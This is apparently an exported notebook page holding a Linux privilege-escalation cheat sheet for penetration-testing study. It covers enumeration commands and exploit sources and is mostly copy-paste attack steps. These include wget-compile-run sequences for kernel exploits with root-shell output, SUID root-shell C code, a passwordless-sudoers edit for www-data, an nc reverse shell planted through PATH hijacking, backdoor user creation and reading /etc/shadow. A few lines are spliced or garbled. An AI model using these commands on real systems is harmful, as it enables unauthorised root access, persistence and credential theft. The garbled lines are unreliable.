italic;">Word-writeable, "nobody" files</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 723px; padding: 8px;"><div>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print # world-writeable files</div><div>find /dir -xdev \( -nouser -o -nogroup \) -print # Noowner files</div></td></tr></table><div><br clear="none"/></div></div><h2>Preparation &amp; Finding Exploit Code</h2><h4>What development tools/languages are installed/supported?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 458px; padding: 8px;"><div>find / -name perl*</div><div>find / -name python*</div><div>find / -name gcc*</div><div>find / -name cc</div></td></tr></table><div><br clear="none"/></div></div><h4>How can files be uploaded?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 416px; padding: 8px;"><div>find / -name wget</div><div>find / -name nc*</div><div>find / -name netcat*</div><div>find / -name tftp*</div><div>find / -name ftp</div></td></tr></table><div><br clear="none"/></div></div><h4>Finding exploit code</h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://www.exploit-db.com/" target="_blank">http://www.exploit-db.com</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://1337day.com/" target="_blank">http://1337day.com</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://www.securiteam.com/" target="_blank">http://www.securiteam.com</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://www.securityfocus.com/" target="_blank">http://www.securityfocus.com</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://www.exploitsearch.net/" target="_blank">http://www.exploitsearch.net</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://metasploit.com/modules/" target="_blank">http://metasploit.com/modules/</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://securityreason.com/" target="_blank">http://securityreason.com</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://seclists.org/fulldisclosure/" target="_blank">http://seclists.org/fulldisclosure/</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://www.google.com/" target="_blank">http://www.google.com</a><br clear="none"/></div><h4>Finding more information regarding the exploit</h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://www.cvedetails.com/" target="_blank">http://www.cvedetails.com</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;">http://packetstormsecurity.org/files/cve/[CVE]</div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;">http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]</div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;">http://www.vulnview.com/cve-details.php?cvename=[CVE]</div><h4>(Quick) "Common" exploits. <span style="font-style: italic;">Warning. Pre-compiled binaries files. Use at your own risk</span></h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/" target="_blank">http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/" target="_blank">http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/</a><br clear="none"/></div><h2>Mitigations</h2><h4>Is any of the above information easy to find?</h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;">Try doing it! Setup a cron job which automates script(s) and/or 3rd party products</div><h4>Is the system fully patched?</h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><span style="font-style: italic;">Kernel, operating system, all applications, their plugins and web services</span></div><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 404px; padding: 8px;"><div>apt-get update &amp;&amp; apt-get upgrade</div><div>yum update</div></td></tr></table><div><br clear="none"/></div></div><h4>Are services running with the minimum level of privileges required?</h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;">For example, do you need to run MySQL as root?</div><h4>Scripts <span style="font-style: italic;">Can any of this be automated?!</span></h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://pentestmonkey.net/tools/unix-privesc-check/" target="_blank">http://pentestmonkey.net/tools/unix-privesc-c</a><div>find /dir -xdev \( -nouser -o -nogroup \) -print # Noowner files</div>heck/<br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://labs.portcullis.co.uk/application/enum4linux/" target="_blank">http://labs.portcullis.co.uk/application/enum4linux/</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://bastille-linux.sourceforge.net/" target="_blank">http://bastille-linux.sourceforge.net</a><br clear="none"/></div><h2>Other (quick) guides &amp; Links</h2><h4>Enumeration</h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://www.0daysecurity.com/penetration-testing/enumeration.html" target="_blank">http://www.0daysecurity.com/penetration-testing/enumeration.html</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://www.microloft.co.uk/hacking/hacking3.htm" target="_blank">http://www.microloft.co.uk/hacking/hacking3.htm</a><br clear="none"/></div><h4>Misc</h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf" target="_blank">http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://pentest.cryptocity.net/files/operations/2009/post_exploitation_fall09.pdf" target="_blank">http://pentest.cryptocity.net/files/operations/2009/post_exploitation_fall09.pdf</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><a shape="rect" href="http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html" target="_blank">http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html</a><br clear="none"/></div></div><div><br clear="none"/></div><div><hr/><ul><li><span style="font-size: 12pt;"><span style="font-weight: bold; font-size: 12pt;">Try the obvious - Maybe the user is root or can sudo to root:</span></span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">  `id</span></div><div><br clear="none"/></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">  sudo su</span></div></div><div><br clear="none"/></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Here are the commands I have learned to use to perform linux enumeration and privledge escalation:</span></span></li></ul></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">What users can login to this box (Do they use thier username as thier password)?:</span></span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">  grep -vE "nologin|false" /etc/passwd</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;"><span style="font-weight: bold; font-size: 10pt;">What kernel version are we using? Do we have any kernel exploits for this version?</span></span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">  uname -a</span></div><div><br clear="none"/></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">What applications have active connections?:</span></span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">  netstat -tulpn</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">What services are running as root?:</span></span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">  ps aux | grep root</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">What files run as root / SUID / GUID?:</span></span></li></ul></div><div><br clear="none"/></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / -perm +2000 -user root -type f -print</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">for `i in locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-weight: bold; font-size: 10pt;">What folders are world writeable?:</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / -writable -type d 2&gt;/dev/null      # world-writeable folders</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-weight: bold; font-size: 10pt;">There are a few scripts that can automate the linux enumeration process:</span></li></ul></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">Google is my favorite Linux Kernel exploitation search tool.  Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your OSCP course.</span></li><li><span style="font-size: 10pt;">LinuxPrivChecker.py - My favorite automated linux priv enumeration checker (</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://www.securitysift.com/download/linuxprivchecker.py" target="_blank">https://www.securitysift.com/download/linuxprivchecker.py</a><span style="font-size: 10pt;">)</span></li><li><span style="font-size: 10pt;">LinEnum - (Recently Updated) (</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://github.com/rebootuser/LinEnum" target="_blank">https://github.com/rebootuser/LinEnum</a><span style="font-size: 10pt;">)</span></li><li><span style="font-size: 10pt;">linux-exploit-suggester (Recently Updated)(</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://github.com/mzet-/linux-exploit-suggester" target="_blank">https://github.com/mzet-/linux-exploit-suggester</a><span style="font-size: 10pt;">)</span></li><li><span style="font-size: 10pt;">Highon.coffee Linux Local Enum - Great enumeration script!  `wget </span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://highon.coffee/downloads/linux-local-enum.sh" target="_blank">https://highon.coffee/downloads/linux-local-enum.sh</a><br clear="none"/></li><li><span style="font-size: 10pt;">Linux Privilege Exploit Suggester  (Old has not been updated in years)(</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://github.com/PenturaLabs/Linux_Exploit_Suggester" target="_blank">https://github.com/PenturaLabs/Linux_Exploit_Suggester</a><span style="font-size: 10pt;">)</span></li><li><span style="font-size: 10pt;">Linux post exploitation enumeration and exploit checking tools [</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://github.com/reider-roque/linpostexp" target="_blank">https://github.com/reider-roque/linpostexp</a><span style="font-size: 10pt;">](</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://github.com/reider-roque/linpostexp" target="_blank">https://github.com/reider-roque/linpostexp</a><span style="font-size: 10pt;">)</span></li></ul></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;"><span style="font-size: 10pt; font-weight: bold;">Handy Kernel Exploits</span></span></li></ul></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) (</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://www.exploit-db.com/exploits/14814/" target="_blank">https://www.exploit-db.com/exploits/14814/</a><span style="font-size: 10pt;">)</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">wget -O i-can-haz-modharden.c </span><a shape="rect" style="font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;" href="http://www.exploit-db.com/download/14814" target="_blank">http://www.exploit-db.com/download/14814</a><br clear="none"/></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">$ gcc i-can-haz-modharden.c -o i-can-haz-modharden</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">$ ./i-can-haz-modharden</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">[+] launching root shell!</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;"># id</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">uid=0(root) gid=0(root)</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">CVE-2010-3904 - Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8 (</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://www.exploit-db.com/exploits/15285/" target="_blank">https://www.exploit-db.com/exploits/15285/</a><span style="font-size: 10pt;">)</span></li></ul></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)(</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://git.zx2c4.com/CVE-2012-0056/about/" target="_blank">https://git.zx2c4.com/CVE-2012-0056/about/</a><span style="font-size: 10pt;">)</span></li></ul></div><div><br clear="none"/></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;"> wget -O exploit.c </span><a shape="rect" style="font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;" href="http://www.exploit-db.com/download/18411" target="_blank">http://www.exploit-db.com/download/18411</a><br clear="none"/></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;"> gcc -o mempodipper exploit.c</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;"> ./mempodipper</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">- CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8 (</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://dirtycow.ninja/" target="_blank">https://dirtycow.ninja/</a><span style="font-size: 10pt;">)First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016</span></li></ul></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">Run a command as a user other than root</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;"> sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">Add a user or change a password</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;"> /usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;"> echo thePassword | passwd haxzor --stdin</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Local Privilege Escalation Exploit in Linux</span></span></li></ul></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">   **SUID** (**S**et owner **U**ser **ID** up on execution)</span></li></ul></div><div>ften SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.</div><div><br clear="none"/></div><div>    below are some quick copy and paste examples for various shells:</div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">SUID C Shell for /bin/bash</span></li></ul></div><div><br clear="none"/></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">int main(void){</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">setresuid(0, 0, 0);</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">system("/bin/bash");</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">}</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">SUID C Shell for /bin/sh</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">int main(void){</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">setresuid(0, 0, 0);</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">system("/bin/sh");</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">}</span></div></div><div><br clear="none"/></div><div>Building the SUID Shell binary</div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">gcc -o suid suid.c</span></div></div><div><br clear="none"/></div><div>For 32 bit:</div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">gcc -m32 -o suid suid.c</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">Create and compile an SUID from a limited shell (no file transfer)</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" &gt;privsc.c</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">gcc privsc.c -o privsc</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">Handy command if you can get a root user to run it. Add the </span><a shape="rect" style="font-size: 10pt; color: #000000;" href="http://www-data/" target="_blank">www-data</a><span style="font-size: 10pt;"> user to Root SUDO group with no password requirement:</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">  echo 'chmod 777 /etc/sudoers &amp;&amp; echo "</span><a shape="rect" style="font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;" href="http://www-data/" target="_blank">www-data</a><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;"> ALL=NOPASSWD:ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your command instead.  In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.1 4444 &gt;/tmp/f" &gt;&gt; /tmp/ssh</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">chmod +x ssh</span></div></div><div><br clear="none"/></div><div><ul><li>SearchSploit</li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">searchsploit –uncsearchsploit apache 2.2</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">searchsploit "Linux Kernel"</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">searchsploit linux 2.6 | grep -i ubuntu | grep local</span></div><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">searchsploit slmail</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">Kernel Exploit Suggestions for Kernel Version 3.0.0</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">   ./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0</span></div></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">Precompiled Linux Kernel Exploits  - ***Super handy if GCC is not installed on the target machine!*** (</span><a shape="rect" style="font-size: 10pt; color: #000000;" href="https://www.kernel-exploits.com/" target="_blank">https://www.kernel-exploits.com/</a><span style="font-size: 10pt;">)</span></li></ul></div><div><br clear="none"/></div><div><ul><li><span style="font-size: 10pt;">Collect root password</span></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">  cat /etc/shadow |grep root</span></div></div><div><div><br clear="none"/></div><ul><li>Find and display the proof.txt or flag.txt - LOOT!</li></ul></div><div style="box-sizing: border-box; padding: 8px; font-size: 12px; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #fbfaf8; border: 1px solid rgba(0, 0, 0, 0.14902);"><div><span style="color: #333333; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px;">  cat find / -name proof.txt -print</span></div></div><div><br clear="none"/></div><div><a shape="rect" style="font-size: 1em; color: #0079d3; line-height: 1.42857em;" 